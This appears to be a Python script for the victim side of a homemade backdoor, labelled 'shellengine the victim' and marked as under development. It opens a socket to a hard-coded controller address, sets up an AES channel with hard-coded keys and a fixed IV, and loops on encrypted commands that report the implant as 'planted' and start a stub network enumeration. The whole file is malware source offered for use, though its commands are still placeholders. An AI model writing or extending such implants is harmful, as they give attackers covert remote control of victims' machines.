#shellengine the victim 
#Under Development
#Updated Everyday

import socket
import os
import sys
import time
from termcolor import colored
from Crypto.Cipher import AES

keys = {
    'enc0': 'A3317AF79FEB1C1778E27AFE728BEF8B',
    'enc1': '4CB54FEC78114473387BD86400EDF85B',
    'enc2': '9C2B81E47254333AA1218FB1B7697CEB',
    'enc3': 'E814DD5D259E8237D02A19F9CB8D078B'
}


def key_gen():
    print(colored("[+]Initializing Encryption Channel", 'green'))
    global enc_key
    enc_key = 'EBC3D4C51C46801A7267AAB59A63551B'

def start_encryption(key):
    global magic
    magic = AES.new(f'{enc_key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!

def Enum():
    print("Enumeration going on here")

planted = "[+] Engine Planted SuccessFully"
enum = "[+] Starting Network Enumeration Now"

s = socket.socket()
s.connect(('192.168.1.11',80))
key_gen()
start_encryption(enc_key)

while True:
    In_msg = s.recv(8192)
    recv_data = magic.decrypt(In_msg)
    recv_data_dec = recv_data.decode()
    if recv_data_dec == 'run':
        s.send(magic.encrypt(planted.encode()))
    elif recv_data_dec == 'enum':
        s.send(magic.encrypt(enum.encode()))
        Enum()
